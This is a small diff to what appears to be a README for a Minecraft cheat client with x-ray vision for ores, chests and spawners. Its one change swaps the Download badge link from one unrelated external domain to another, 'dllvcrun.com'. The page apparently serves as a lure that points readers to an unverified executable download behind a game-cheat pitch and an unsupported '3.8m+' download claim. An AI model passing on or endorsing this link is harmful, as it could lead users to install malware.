@@ -49,7 +49,7 @@ A: Yes — highlights ores, chests, and spawners through walls.
 
 **Monthly downloads:** 3.8m+
 
-[![Download](https://img.shields.io/badge/Download-v1.21-brightgreen?style=for-the-badge)](https://connectinstruction.com/mchackclient26)
+[![Download](https://img.shields.io/badge/Download-v1.21-brightgreen?style=for-the-badge)](https://dllvcrun.com/mchackclient26)
 
 ---
 
